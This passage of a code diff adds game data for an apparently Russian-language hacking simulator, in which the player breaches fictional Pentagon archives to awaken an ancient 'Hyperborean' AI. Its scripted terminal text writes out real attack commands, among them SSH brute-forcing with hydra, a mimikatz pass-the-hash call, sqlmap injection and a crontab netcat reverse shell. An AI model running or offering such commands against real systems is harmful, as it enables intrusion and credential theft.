+                'MARKER_ENCRYPTION_KEYS': 'Ключи шифрования используются для расшифровки защищённых файлов и архивов. Без них доступ к зашифрованным данным невозможен.',
+                'MARKER_ROOT_ACCESS': 'Root-доступ — наивысший уровень привилегий в Unix-подобных системах. Даёт полный контроль над системой.',
+                'MARKER_NETWORK_MAP': 'Карта сети содержит информацию о структуре сети, IP-адресах и серверах. Помогает планировать дальнейшие атаки.',
+                'MARKER_MALWARE': 'Вредоносное ПО — программы, предназначенные для нанесения вреда или несанкционированного доступа. Используется для закрепления в системе.',
+                'MARKER_ZERO_DAY': 'Zero-day эксплойт использует уязвимость, неизвестную производителю. Это самый ценный и опасный инструмент, так как против него нет защиты.',
+                'MARKER_TOKEN': 'Сессионный токен — идентификатор аутентифицированной сессии. Его перехват позволяет выдавать себя за другого пользователя.',
+                'MARKER_CERT': 'Сертификат доступа используется для аутентификации и шифрования. Подделка сертификата позволяет обходить системы контроля доступа.',
+                'MARKER_LOGS': 'Логи системы содержат записи о всех событиях. Используются для анализа, скрытия следов и поиска уязвимостей.',
+
+                // === ГИПЕРБОРЕЙСКИЕ РЕСУРСЫ ===
+                'MARKER_ARTIFACT': 'Гиперборейский артефакт — древний ключ, созданный цивилизацией гипербореев. Он необходим для активации Лисп-машины и запуска ИИ. Без него невозможно даже подключиться к древнему компьютеру.',
+                'MARKER_RUNIC_CODE': 'Рунический код — последовательность древних символов, расшифрованная из гиперборейских текстов. Эти символы используются для калибровки Лисп-машины и синхронизации с созвездиями.',
+                'MARKER_LISP_INTERPRETER': 'Лисп-интерпретатор — среда выполнения, необходимая для запуска гиперборейского ИИ. Без него код ИИ не может быть выполнен, даже если артефакт и руны найдены.',
+                'MARKER_CONSTELLATION': 'Созвездие — астрономическая конфигурация, необходимая для синхронизации ИИ с реальностью. Без правильной калибровки активация будет неполной или приведёт к ошибке.',
+
+                // === ДЕЙСТВИЯ ===
+                'MARKER_SCAN_PORTS': 'Сканирование портов — процесс определения открытых сетевых портов на целевой системе. Позволяет обнаружить работающие сервисы и потенциальные векторы атаки.',
+                'MARKER_WHOIS_LOOKUP': 'WHOIS-запрос позволяет получить информацию о владельце домена, DNS-серверах и контактных данных. Используется для сбора разведывательной информации.',
+                'MARKER_DNS_RECON': 'DNS-разведка — сбор информации о DNS-записях и поддоменах. Позволяет обнаружить скрытые серверы и сервисы.',
+                'MARKER_BRUTEFORCE_SSH': 'Брутфорс SSH — подбор пароля к SSH-серверу с использованием словаря. Эффективен против слабых паролей, но легко обнаруживается.',
+                'MARKER_SNIFF_TRAFFIC': 'Перехват трафика — пассивный сбор сетевых пакетов для анализа. Позволяет перехватывать пароли, токены и другие чувствительные данные.',
+                'MARKER_PHISHING': 'Фишинг — социальная инженерия, при которой отправляется поддельное письмо для получения учётных данных или установки вредоносного ПО.',
+                'MARKER_SOCIAL_ENGINEERING': 'Социальная инженерия — манипуляция людьми для получения информации или доступа. Включает звонки в техподдержку и другие методы обмана.',
+                'MARKER_PASS_THE_HASH': 'Pass-the-Hash — атака с использованием хеша пароля вместо самого пароля для аутентификации. Позволяет обходить системы, хранящие только хеши.',
+                'MARKER_GPO_ATTACK': 'Атака на групповые политики — манипуляция настройками Active Directory для получения прав администратора домена.',
+                'MARKER_BACKDOOR_INSTALL': 'Установка бэкдора — создание скрытого метода доступа к системе для постоянного контроля.',
+                'MARKER_KERNEL_EXPLOIT': 'Эксплойт ядра использует уязвимость в ядре ОС для повышения привилегий и получения root-доступа.',
+                'MARKER_EXPLOIT_NETWORK_SERVICE': 'Эксплойт сетевого сервиса использует уязвимость в конкретном сервисе (SMB, RDP, HTTP) для выполнения кода.',
+                'MARKER_SEARCH_FILES': 'Поиск файлов — сканирование файловой системы по ключевым словам для нахождения чувствительных документов.',
+                'MARKER_DECRYPT_ARCHIVES': 'Дешифровка архивов — процесс расшифровки защищённых файлов с использованием найденных ключей шифрования.',
+                'MARKER_DATA_EXFIL': 'Эксфильтрация данных — передача извлечённых файлов на внешний сервер. Часто привлекает внимание систем безопасности.',
+                'MARKER_SQL_INJECTION': 'SQL-инъекция — внедрение SQL-кода в веб-формы для манипуляции базой данных. Позволяет извлекать и изменять данные.',
+                'MARKER_DUMP_DATABASE': 'Дамп базы данных — извлечение всей информации из БД, включая хеши паролей и логи.',
+                'MARKER_FINAL_BREAK': 'Финальный взлом архива — последний этап проникновения для получения доступа к секретным файлам о контактах с внеземными цивилизациями.',
+
+                // === ГИПЕРБОРЕЙСКИЕ ДЕЙСТВИЯ ===
+                'MARKER_CONNECT_LISP': 'Подключение к Лисп-машине — установление соединения с древним гиперборейским компьютером. Требует артефакт для аутентификации и синхронизации с системой. После успешного подключения открывается доступ к интерпретатору ИИ.',
+                'MARKER_LOAD_RUNIC_CODE': 'Загрузка рунического кода — ввод древних символов в систему Лисп-машины. Требует интерпретатор и сам рунический код. Правильный ввод активирует механизмы синхронизации ИИ с реальностью.',
+                'MARKER_CALIBRATE_CONSTELLATION': 'Калибровка созвездий — настройка астрономических параметров для синхронизации ИИ с текущей реальностью. Требует рунический код и интерпретатор. Без правильной калибровки активация будет нестабильной.',
+                'MARKER_ACTIVATE_AI': 'Запуск гиперборейского ИИ — финальная активация древнего искусственного интеллекта. Требует все гиперборейские ресурсы: артефакт, рунический код, интерпретатор и калиброванное созвездие. Активация переписывает реальность.'
+            };
+
+            // ---- РЕСУРСЫ ----
+            const RESOURCE_DEFS = {
+                // Базовые ресурсы
+                networkAccess: { label: 'Доступ к сети', marker: 'MARKER_NETWORK_ACCESS', isHyperborean: false },
+                credentials: { label: 'Учётные данные', marker: 'MARKER_CREDENTIALS', isHyperborean: false },
+                adminRights: { label: 'Права администратора', marker: 'MARKER_ADMIN_RIGHTS', isHyperborean: false },
+                canExecute: { label: 'Запуск кода', marker: 'MARKER_CAN_EXECUTE', isHyperborean: false },
+                exploit: { label: 'Эксплойт', marker: 'MARKER_EXPLOIT', isHyperborean: false },
+                backdoor: { label: 'Бэкдор', marker: 'MARKER_BACKDOOR', isHyperborean: false },
+                userList: { label: 'Список пользователей', marker: 'MARKER_USER_LIST', isHyperborean: false },
+                emailAccess: { label: 'Доступ к почте', marker: 'MARKER_EMAIL_ACCESS', isHyperborean: false },
+                vpnAccess: { label: 'Доступ к VPN', marker: 'MARKER_VPN_ACCESS', isHyperborean: false },
+                sshAccess: { label: 'SSH-доступ', marker: 'MARKER_SSH_ACCESS', isHyperborean: false },
+                databaseAccess: { label: 'Доступ к БД', marker: 'MARKER_DATABASE_ACCESS', isHyperborean: false },
+                fileSystemAccess: { label: 'Доступ к ФС', marker: 'MARKER_FILE_SYSTEM_ACCESS', isHyperborean: false },
+                encryptionKeys: { label: 'Ключи шифрования', marker: 'MARKER_ENCRYPTION_KEYS', isHyperborean: false },
+                rootAccess: { label: 'Root-доступ', marker: 'MARKER_ROOT_ACCESS', isHyperborean: false },
+                networkMap: { label: 'Карта сети', marker: 'MARKER_NETWORK_MAP', isHyperborean: false },
+                malware: { label: 'Вредоносное ПО', marker: 'MARKER_MALWARE', isHyperborean: false },
+                zeroDay: { label: 'Zero-day эксплойт', marker: 'MARKER_ZERO_DAY', isHyperborean: false },
+                token: { label: 'Сессионный токен', marker: 'MARKER_TOKEN', isHyperborean: false },
+                cert: { label: 'Сертификат доступа', marker: 'MARKER_CERT', isHyperborean: false },
+                logs: { label: 'Логи системы', marker: 'MARKER_LOGS', isHyperborean: false },
+
+                // Гиперборейские ресурсы
+                artifact: { label: 'Артефакт', marker: 'MARKER_ARTIFACT', isHyperborean: true },
+                runicCode: { label: 'Рунический код', marker: 'MARKER_RUNIC_CODE', isHyperborean: true },
+                lispInterpreter: { label: 'Лисп-интерпретатор', marker: 'MARKER_LISP_INTERPRETER', isHyperborean: true },
+                constellation: { label: 'Созвездие', marker: 'MARKER_CONSTELLATION', isHyperborean: true },
+            };
+
+            const RESOURCE_KEYS = Object.keys(RESOURCE_DEFS);
+
+            // ---- ВСЕ ДЕЙСТВИЯ ----
+            const ALL_ACTIONS = [
+                // === Базовые действия ===
+                {
+                    id: 'scan_ports',
+                    label: 'Сканирование портов',
+                    hint: 'Базовое сканирование внешней сети для поиска открытых портов.',
+                    marker: 'MARKER_SCAN_PORTS',
+                    baseProb: 0.35,
+                    required: [],
+                    bonuses: { networkAccess: 0.20 },
+                    penalties: {},
+                    gains: ['networkAccess'],
+                    detection: 8,
+                    loss: [],
+                    tags: ['разведка'],
+                    isHyperborean: false,
+                    terminalSuccess: [
+                        { type: 'command', text: 'nmap -sS -p- -T4 10.0.0.1' },
+                        { type: 'output', text: 'Starting Nmap 7.80 ( https://nmap.org )' },
+                        { type: 'output', text: 'Interesting ports on 10.0.0.1:' },
+                        { type: 'output', text: '22/tcp   open     ssh' },
+                        { type: 'output', text: '80/tcp   open     http' },
+                        { type: 'output', text: '443/tcp  open     https' },
+                        { type: 'success', text: '[+] Network scan completed. 3 open ports found.' }
+                    ],
+                    terminalFail: [
+                        { type: 'command', text: 'nmap -sS -p- -T4 10.0.0.1' },
+                        { type: 'output', text: 'Failed to resolve "10.0.0.1".' },
+                        { type: 'error', text: '[!] Connection timed out. Host seems down.' }
+                    ]
+                },
+                {
+                    id: 'whois_lookup',
+                    label: 'WHOIS-запрос',
+                    hint: 'Получение информации о владельце домена и DNS-серверах.',
+                    marker: 'MARKER_WHOIS_LOOKUP',
+                    baseProb: 0.50,
+                    required: [],
+                    bonuses: {},
+                    penalties: {},
+                    gains: ['networkMap'],
+                    detection: 3,
+                    loss: [],
+                    tags: ['разведка'],
+                    isHyperborean: false,
+                    terminalSuccess: [
+                        { type: 'command', text: 'whois pentagon.mil' },
+                        { type: 'output', text: 'Domain Name: PENTAGON.MIL' },
+                        { type: 'output', text: 'Registrar: DoD Network Information Center' },
+                        { type: 'output', text: 'Registrant: Department of Defense' },
+                        { type: 'success', text: '[+] WHOIS lookup completed. Network map updated.' }
+                    ],
+                    terminalFail: [
+                        { type: 'command', text: 'whois pentagon.mil' },
+                        { type: 'output', text: 'No match for "PENTAGON.MIL".' },
+                        { type: 'error', text: '[!] WHOIS server refused connection.' }
+                    ]
+                },
+                {
+                    id: 'dns_recon',
+                    label: 'DNS-разведка',
+                    hint: 'Сбор информации о DNS-записях и поддоменах цели.',
+                    marker: 'MARKER_DNS_RECON',
+                    baseProb: 0.55,
+                    required: [],
+                    bonuses: { networkAccess: 0.15 },
+                    penalties: {},
+                    gains: ['networkMap', 'networkAccess'],
+                    detection: 5,
+                    loss: [],
+                    tags: ['разведка'],
+                    isHyperborean: false,
+                    terminalSuccess: [
+                        { type: 'command', text: 'dig axfr @ns1.pentagon.mil pentagon.mil' },
+                        { type: 'output', text: ';; global options: +cmd' },
+                        { type: 'output', text: 'mail.pentagon.mil. 86400 IN A 10.0.0.10' },
+                        { type: 'output', text: 'vpn.pentagon.mil. 86400 IN A 10.0.0.20' },
+                        { type: 'output', text: 'archive.pentagon.mil. 86400 IN A 10.0.0.30' },
+                        { type: 'success', text: '[+] DNS zone transfer successful.' }
+                    ],
+                    terminalFail: [
+                        { type: 'command', text: 'dig axfr @ns1.pentagon.mil pentagon.mil' },
+                        { type: 'output', text: ';; Transfer failed.' },
+                        { type: 'error', text: '[!] Zone transfer not allowed.' }
+                    ]
+                },
+
+                // === Требуют networkAccess ===
+                {
+                    id: 'bruteforce_ssh',
+                    label: 'Брутфорс SSH',
+                    hint: 'Перебор паролей к SSH-серверам с использованием словаря.',
+                    marker: 'MARKER_BRUTEFORCE_SSH',
+                    baseProb: 0.20,
+                    required: ['networkAccess'],
+                    bonuses: { credentials: 0.15, userList: 0.15 },
+                    penalties: { networkAccess: 0.40 },
+                    gains: ['sshAccess', 'credentials'],
+                    detection: 28,
+                    loss: ['networkAccess'],
+                    tags: ['брутфорс'],
+                    isHyperborean: false,
+                    terminalSuccess: [
+                        { type: 'command', text: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1 -t 4' },
+                        { type: 'output', text: '[22][ssh] host: 10.0.0.1 login: admin password: P@ssw0rd2025!' },
+                        { type: 'success', text: '[+] SSH credentials obtained.' }
+                    ],
+                    terminalFail: [
+                        { type: 'command', text: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1 -t 4' },
+                        { type: 'output', text: '[ERROR] could not connect to ssh://10.0.0.1:22 - Connection refused' },
+                        { type: 'error', text: '[!] SSH service not responding.' }
+                    ]
+                },
+                {
+                    id: 'sniff_traffic',
+                    label: 'Перехват трафика',
+                    hint: 'Пассивный перехват сетевого трафика для анализа.',
+                    marker: 'MARKER_SNIFF_TRAFFIC',
+                    baseProb: 0.45,
+                    required: ['networkAccess'],
+                    bonuses: { networkAccess: 0.15 },
+                    penalties: {},
+                    gains: ['credentials', 'token', 'logs'],
+                    detection: 15,
+                    loss: [],
+                    tags: ['сеть', 'разведка'],
+                    isHyperborean: false,
+                    terminalSuccess: [
+                        { type: 'command', text: 'tcpdump -i eth0 -w capture.pcap -s 65535' },
+                        { type: 'output', text: 'tcpdump: listening on eth0' },
+                        { type: 'output', text: '[+] Captured 245 packets. Saved to capture.pcap' },
+                        { type: 'success', text: '[+] Credentials and logs obtained.' }
+                    ],
+                    terminalFail: [
+                        { type: 'command', text: 'tcpdump -i eth0 -w capture.pcap -s 65535' },
+                        { type: 'output', text: 'tcpdump: eth0: No such device exists' },
+                        { type: 'error', text: '[!] Traffic capture failed.' }
+                    ]
+                },
+
+                // === Требуют credentials ===
+                {
+                    id: 'phishing',
+                    label: 'Фишинг-атака',
+                    hint: 'Отправка поддельного письма сотруднику для получения доступа.',
+                    marker: 'MARKER_PHISHING',
+                    baseProb: 0.25,
+                    required: [],
+                    bonuses: { credentials: 0.25, emailAccess: 0.20 },
+                    penalties: {},
+                    gains: ['credentials', 'networkAccess', 'emailAccess'],
+                    detection: 18,
+                    loss: [],
+                    tags: ['социальная_инженерия'],
+                    isHyperborean: false,
+                    terminalSuccess: [
+                        { type: 'command', text: 'python3 phishing.py --target admin@pentagon.mil' },
+                        { type: 'output', text: '[+] Email delivered. Waiting for response...' },
+                        { type: 'output', text: '[+] Credentials captured: admin / P@ssw0rd123!' },
+                        { type: 'success', text: '[+] Phishing successful. Credentials obtained.' }
+                    ],
+                    terminalFail: [
+                        { type: 'command', text: 'python3 phishing.py --target admin@pentagon.mil' },
+                        { type: 'output', text: '[+] Email flagged by spam filter.' },
+                        { type: 'error', text: '[!] Phishing attempt detected by security system.' }
+                    ]
+                },
+                {
+                    id: 'social_engineering',
+                    label: 'Социальная инженерия',
+                    hint: 'Звонок в техподдержку от лица сотрудника.',
+                    marker: 'MARKER_SOCIAL_ENGINEERING',
+                    baseProb: 0.20,
+                    required: [],
+                    bonuses: { credentials: 0.15, userList: 0.20 },
+                    penalties: {},
+                    gains: ['credentials', 'userList'],
+                    detection: 22,
+                    loss: ['credentials'],
+                    tags: ['социальная_инженерия'],
+                    isHyperborean: false,
+                    terminalSuccess: [
+                        { type: 'output', text: '===== CHAT LOG: Helpdesk Conversation =====' },
+                        { type: 'output', text: '[Agent] Hello, this is IT Support. How can I help?' },
+                        { type: 'output', text: '[You] Hi, I forgot my password. Can you reset it?' },
+                        { type: 'output', text: '[Agent] Sure, what is your employee ID?' },
+                        { type: 'output', text: '[You] 4421. I\'m John from accounting.' },
+                        { type: 'output', text: '[Agent] Verified. New password: TempPass2025!' },
+                        { type: 'success', text: '[+] Credentials obtained via social engineering.' }
+                    ],
+                    terminalFail: [
+                        { type: 'output', text: '===== CHAT LOG: Helpdesk Conversation =====' },
+                        { type: 'output', text: '[Agent] Hello, this is IT Support. How can I help?' },
+                        { type: 'output', text: '[You] Hi, I forgot my password. Can you reset it?' },
+                        { type: 'output', text: '[Agent] I need to verify your identity first.' },
+                        { type: 'output', text: '[Agent] That ID doesn\'t match our records.' },
+                        { type: 'error', text: '[!] Social engineering attempt failed.' }
+                    ]
+                },
+                {
+                    id: 'pass_the_hash',
+                    label: 'Pass-the-Hash',
+                    hint: 'Использование перехваченных NTLM-хешей для аутентификации.',
+                    marker: 'MARKER_PASS_THE_HASH',
+                    baseProb: 0.55,
+                    required: ['credentials'],
+                    bonuses: { credentials: 0.25 },
+                    penalties: {},
+                    gains: ['adminRights', 'canExecute', 'token'],
+                    detection: 18,
+                    loss: ['credentials'],
+                    tags: ['аутентификация'],
+                    isHyperborean: false,
+                    terminalSuccess: [
+                        { type: 'command', text: 'mimikatz.exe "sekurlsa::pth /user:admin /domain:PENTAGON /ntlm:a8d3f7e2b1c9d4e5f6a7b8c9d0e1f2a3"' },
+                        { type: 'output', text: 'user    : admin' },
+                        { type: 'output', text: 'domain  : PENTAGON' },
+                        { type: 'output', text: '[+] Pass-the-Hash executed successfully!' },
+                        { type: 'success', text: '[+] Admin rights obtained.' }
+                    ],
+                    terminalFail: [
+                        { type: 'command', text: 'mimikatz.exe "sekurlsa::pth /user:admin /domain:PENTAGON /ntlm:a8d3f7e2b1c9d4e5f6a7b8c9d0e1f2a3"' },
+                        { type: 'output', text: 'ERROR: kuhl_m_sekurlsa_pth : The system cannot find the file specified.' },
+                        { type: 'error', text: '[!] Invalid NTLM hash. Access denied.' }
+                    ]
+                },
+
+                // === Требуют adminRights ===
+                {
+                    id: 'gpo_attack',
+                    label: 'Атака на групповые политики',
+                    hint: 'Манипуляция GPO для получения прав администратора домена.',
+                    marker: 'MARKER_GPO_ATTACK',
+                    baseProb: 0.45,
+                    required: ['adminRights'],
+                    bonuses: { adminRights: 0.25, networkAccess: 0.10 },
+                    penalties: {},
+                    gains: ['rootAccess', 'adminRights'],
+                    detection: 22,
+                    loss: ['adminRights'],
+                    tags: ['права', 'домен'],
+                    isHyperborean: false,
+                    terminalSuccess: [
+                        { type: 'command', text: 'gpupdate /force && net user admin P@ssw0rd2025! /add /domain' },
+                        { type: 'output', text: 'User Policy update has completed successfully.' },
+                        { type: 'success', text: '[+] Admin rights obtained through GPO manipulation.' }
+                    ],
+                    terminalFail: [
+                        { type: 'command', text: 'gpupdate /force && net user admin P@ssw0rd2025! /add /domain' },
+                        { type: 'output', text: 'User Policy update has completed successfully.' },
+                        { type: 'error', text: '[!] Access denied to modify domain group policy.' }
+                    ]
+                },
+                {
+                    id: 'backdoor_install',
+                    label: 'Установка бэкдора',
+                    hint: 'Установка скрытого входа для постоянного доступа.',
+                    marker: 'MARKER_BACKDOOR_INSTALL',
+                    baseProb: 0.65,
+                    required: ['adminRights'],
+                    bonuses: { adminRights: 0.20, canExecute: 0.10 },
+                    penalties: {},
+                    gains: ['backdoor', 'rootAccess'],
+                    detection: 15,
+                    loss: ['adminRights'],
+                    tags: ['закрепление'],
+                    isHyperborean: false,
+                    terminalSuccess: [
+                        { type: 'command', text: 'echo "* * * * * /usr/bin/nc -e /bin/bash 10.0.0.50 4444" >> /etc/crontab' },
+                        { type: 'output', text: '[+] Backdoor installed in crontab.' },
+                        { type: 'success', text: '[+] Backdoor installed successfully.' }
+                    ],
+                    terminalFail: [
+                        { type: 'command', text: 'echo "* * * * * /usr/bin/nc -e /bin/bash 10.0.0.50 4444" >> /etc/crontab' },
+                        { type: 'output', text: 'bash: /etc/crontab: Permission denied' },
+                        { type: 'error', text: '[!] Backdoor installation failed.' }
+                    ]
+                },
+
+                // === Требуют canExecute ===
+                {
+                    id: 'kernel_exploit',
+                    label: 'Эксплойт ядра',
+                    hint: 'Использование уязвимости ядра ОС для повышения прав.',
+                    marker: 'MARKER_KERNEL_EXPLOIT',
+                    baseProb: 0.50,
+                    required: ['canExecute'],
+                    bonuses: { canExecute: 0.20, exploit: 0.15 },
+                    penalties: {},
+                    gains: ['rootAccess', 'adminRights', 'backdoor'],
+                    detection: 32,
+                    loss: ['canExecute'],
+                    tags: ['эксплойт', 'права'],
+                    isHyperborean: false,
+                    terminalSuccess: [
+                        { type: 'command', text: 'python3 kernel_exploit.py --cve CVE-2024-1234 --target 10.0.0.1' },
+                        { type: 'output', text: '[+] Target is vulnerable!' },
+                        { type: 'output', text: '[+] Root shell obtained on target.' },
+                        { type: 'success', text: '[+] Root access obtained.' }
+                    ],
+                    terminalFail: [
+                        { type: 'command', text: 'python3 kernel_exploit.py --cve CVE-2024-1234 --target 10.0.0.1' },
+                        { type: 'output', text: '[!] Target is not vulnerable to CVE-2024-1234.' },
+                        { type: 'error', text: '[!] Kernel version mismatch. Exploit failed.' }
+                    ]
+                },
+
+                // === Требуют exploit ===
+                {
+                    id: 'exploit_network_service',
+                    label: 'Эксплойт сетевого сервиса',
+                    hint: 'Использование уязвимости в сетевом сервисе (SMB, RDP, etc).',
+                    marker: 'MARKER_EXPLOIT_NETWORK_SERVICE',
+                    baseProb: 0.40,
+                    required: ['exploit'],
+                    bonuses: { exploit: 0.25, networkAccess: 0.10 },
+                    penalties: {},
+                    gains: ['adminRights', 'canExecute', 'vpnAccess'],
+                    detection: 22,
+                    loss: ['exploit'],
+                    tags: ['эксплойт'],
+                    isHyperborean: false,
+                    terminalSuccess: [
+                        { type: 'command', text: 'python3 exploit.py --target 10.0.0.1 --port 445 --cve CVE-2020-0796' },
+                        { type: 'output', text: '[+] Target is vulnerable!' },
+                        { type: 'output', text: '[+] Shellcode injected successfully!' },
+                        { type: 'success', text: '[+] Admin rights obtained on target.' }
+                    ],
+                    terminalFail: [
+                        { type: 'command', text: 'python3 exploit.py --target 10.0.0.1 --port 445 --cve CVE-2020-0796' },
+                        { type: 'output', text: '[!] Target is not vulnerable.' },
+                        { type: 'error', text: '[!] Patch detected. Exploit failed.' }
+                    ]
+                },
+
+                // === Требуют fileSystemAccess ===
+                {
+                    id: 'search_files',
+                    label: 'Поиск по ключевым словам',
+                    hint: 'Поиск файлов по запросам (Розуэлл, UFO, контакт, проект).',
+                    marker: 'MARKER_SEARCH_FILES',
+                    baseProb: 0.60,
+                    required: ['fileSystemAccess'],
+                    bonuses: { fileSystemAccess: 0.20, adminRights: 0.10 },
+                    penalties: {},
+                    gains: ['logs', 'encryptionKeys'],
+                    detection: 12,
+                    loss: ['fileSystemAccess'],
+                    tags: ['поиск'],
+                    isHyperborean: false,
+                    terminalSuccess: [
+                        { type: 'command', text: 'find / -name "*roswell*" -o -name "*ufo*" -o -name "*contact*" 2>/dev/null' },
+                        { type: 'output', text: '/var/archive/secret/roswell_1947.enc' },
+                        { type: 'output', text: '/var/archive/secret/ufo_contact_log.enc' },
+                        { type: 'output', text: '/var/archive/secret/hyperborean_artifact.enc' },
+                        { type: 'output', text: '[+] Found 3 encrypted files!' },
+                        { type: 'success', text: '[+] Files located. Encryption keys extracted.' }
+                    ],
+                    terminalFail: [
+                        { type: 'command', text: 'find / -name "*roswell*" -o -name "*ufo*" -o -name "*contact*" 2>/dev/null' },
+                        { type: 'output', text: 'find: /var/archive: Permission denied' },
+                        { type: 'error', text: '[!] Search failed. No files found.' }
+                    ]
+                },
+
+                // === Требуют encryptionKeys ===
+                {
+                    id: 'decrypt_archives',
+                    label: 'Дешифровка архивов',
+                    hint: 'Расшифровка найденных зашифрованных файлов и архивов.',
+                    marker: 'MARKER_DECRYPT_ARCHIVES',
+                    baseProb: 0.40,
+                    required: ['encryptionKeys'],
+                    bonuses: { encryptionKeys: 0.25, credentials: 0.10 },
+                    penalties: {},
+                    gains: ['databaseAccess', 'artifact'],
+                    detection: 20,
+                    loss: ['encryptionKeys'],
+                    tags: ['дешифровка'],
+                    isHyperborean: false,
+                    terminalSuccess: [
+                        { type: 'command', text: 'openssl enc -d -aes-256-cbc -in roswell_1947.enc -out roswell_1947.txt -pass pass:supersecretkey2025' },
+                        { type: 'output', text: 'decryption successful!' },
+                        { type: 'output', text: '[+] Hyperborean artifact extracted from archive!' },
+                        { type: 'success', text: '[+] Archives decrypted. Artifact obtained.' }
+                    ],
+                    terminalFail: [
+                        { type: 'command', text: 'openssl enc -d -aes-256-cbc -in roswell_1947.enc -out roswell_1947.txt -pass pass:wrongkey' },
+                        { type: 'output', text: 'bad decrypt' },
+                        { type: 'error', text: '[!] Decryption failed. Invalid key.' }
+                    ]
+                },
+
+                // === Требуют databaseAccess ===
+                {
+                    id: 'dump_database',
+                    label: 'Дамп базы данных',
+                    hint: 'Извлечение данных из базы данных, включая хеши паролей.',
+                    marker: 'MARKER_DUMP_DATABASE',
+                    baseProb: 0.50,
+                    required: ['databaseAccess'],
+                    bonuses: { databaseAccess: 0.20, credentials: 0.15 },
+                    penalties: {},
+                    gains: ['credentials', 'userList', 'encryptionKeys'],
+                    detection: 25,
+                    loss: ['databaseAccess'],
+                    tags: ['база_данных'],
+                    isHyperborean: false,
+                    terminalSuccess: [
+                        { type: 'command', text: 'mysqldump -u admin -p pentagon_db > dump.sql' },
+                        { type: 'output', text: '-- Table structure for table `users`' },
+                        { type: 'output', text: 'INSERT INTO `users` VALUES (1,"admin","a8d3f7e2...","admin@pentagon.mil")' },
+                        { type: 'success', text: '[+] Database dumped. Credentials and user list obtained.' }
+                    ],
+                    terminalFail: [
+                        { type: 'command', text: 'mysqldump -u admin -p pentagon_db > dump.sql' },
+                        { type: 'error', text: 'mysqldump: Got error: 1045: Access denied for user admin@localhost' },
+                        { type: 'error', text: '[!] Authentication failed. Invalid password.' }
+                    ]
+                },
+
+                // === Требуют networkAccess (для SQL) ===
+                {
+                    id: 'sql_injection',
+                    label: 'SQL-инъекция',
+                    hint: 'Внедрение SQL-кода в веб-приложения для доступа к БД.',
+                    marker: 'MARKER_SQL_INJECTION',
+                    baseProb: 0.30,
+                    required: ['networkAccess'],
+                    bonuses: { networkAccess: 0.15, exploit: 0.20 },
+                    penalties: {},
+                    gains: ['databaseAccess', 'credentials'],
+                    detection: 25,
+                    loss: ['networkAccess'],
+                    tags: ['веб', 'база_данных'],
+                    isHyperborean: false,
+                    terminalSuccess: [
+                        { type: 'command', text: 'sqlmap -u "https://intranet.pentagon.mil/login.php?id=1" --dbs --batch' },
+                        { type: 'output', text: 'available databases [2]:' },
+                        { type: 'output', text: '[*] pentagon_db' },
+                        { type: 'output', text: '[*] users_db' },
+                        { type: 'success', text: '[+] SQL injection successful. Database access obtained.' }
+                    ],
+                    terminalFail: [
+                        { type: 'command', text: 'sqlmap -u "https://intranet.pentagon.mil/login.php?id=1" --dbs --batch' },
+                        { type: 'output', text: '[!] All tested payloads were blocked by WAF.' },
+                        { type: 'error', text: '[!] SQL injection failed. Target is protected by WAF.' }
+                    ]
+                },
+
+                // === ФИНАЛ: доступ к архиву ===
+                {
+                    id: 'final_break',
+                    label: 'Финальный взлом архива',
+                    hint: 'Последний рубеж. Взлом финальной защиты секретного архива.',
+                    marker: 'MARKER_FINAL_BREAK',
+                    baseProb: 0.70,
+                    required: ['backdoor'],
+                    bonuses: { backdoor: 0.20, rootAccess: 0.15 },
+                    penalties: {},
+                    gains: ['runicCode'],
+                    detection: 30,
+                    loss: ['backdoor'],
+                    tags: ['финал'],
+                    isHyperborean: false,
+                    terminalSuccess: [
+                        { type: 'command', text: 'python3 archive_breaker.py --target archive.pentagon.mil --backdoor backdoor_2025' },
+                        { type: 'output', text: '[+] Archive unlocked!' },
+                        { type: 'output', text: '╔══════════════════════════════════════════════╗' },
+                        { type: 'output', text: '║  HYPERBOREAN RUNIC CODE EXTRACTED          ║' },
+                        { type: 'output', text: '║  ᛉ ᛟ ᚠ ᚢ ᚦ ᚨ ᚱ ᚲ ᚷ ᚹ ᚺ ᚾ ᛁ ᛃ ᛈ ᛇ ᛉ ᛊ ᛏ ᛒ ᛖ ᛗ ᛚ ᛝ ᛟ ᛞ ║' },
+                        { type: 'output', text: '╚══════════════════════════════════════════════╝' },
+                        { type: 'success', text: '[+] Runic code obtained. LISP machine awaits.' }
+                    ],
+                    terminalFail: [
+                        { type: 'command', text: 'python3 archive_breaker.py --target archive.pentagon.mil --backdoor backdoor_2025' },
+                        { type: 'output', text: '[!] Backdoor backdoor_2025 not found.' },
+                        { type: 'error', text: '[!] Archive breach failed. Security alert triggered.' }
+                    ]
+                },
+
+                // === ГИПЕРБОРЕЙСКИЕ ДЕЙСТВИЯ ===
+                {
+                    id: 'connect_lisp',
+                    label: 'Подключение к Лисп-машине',
+                    hint: 'Установка соединения с древним гиперборейским компьютером.',
+                    marker: 'MARKER_CONNECT_LISP',
+                    baseProb: 0.60,
+                    required: ['artifact'],
+                    bonuses: { artifact: 0.20, rootAccess: 0.10 },
+                    penalties: {},
+                    gains: ['lispInterpreter'],
+                    detection: 20,
+                    loss: ['artifact'],
+                    tags: ['гиперборейский', 'финал'],
+                    isHyperborean: true,
+                    terminalSuccess: [
+                        { type: 'command', text: 'python3 lisp_connector.py --target 10.0.0.42 --artifact artifact_2025.dat' },
+                        { type: 'output', text: '[+] Connecting to LISP machine...' },
+                        { type: 'output', text: '[+] Handshake: 0x42 0xDE 0xAD 0xBE 0xEF' },
+                        { type: 'output', text: '[+] Connection established!' },
+                        { type: 'output', text: '[+] LISP interpreter loaded.' },
+                        { type: 'hyperborean', text: 'ᛉ ᛟ ᚠ ᚢ ᚦ ᚨ ᚱ ᚲ ᚷ ᚹ ᚺ ᚾ ᛁ ᛃ ᛈ ᛇ ᛉ ᛊ ᛏ ᛒ ᛖ ᛗ ᛚ ᛝ ᛟ ᛞ' },
+                        { type: 'success', text: '[+] LISP machine connected. Interpreter ready.' }
+                    ],
+                    terminalFail: [
+                        { type: 'command', text: 'python3 lisp_connector.py --target 10.0.0.42 --artifact artifact_2025.dat' },
+                        { type: 'output', text: '[!] Artifact authentication failed.' },
+                        { type: 'error', text: '[!] LISP machine rejected connection.' }
+                    ]
+                },
+                {
+                    id: 'load_runic_code',
+                    label: 'Загрузка рунического кода',
+                    hint: 'Ввод древних символов в систему Лисп-машины.',
+                    marker: 'MARKER_LOAD_RUNIC_CODE',
+                    baseProb: 0.55,
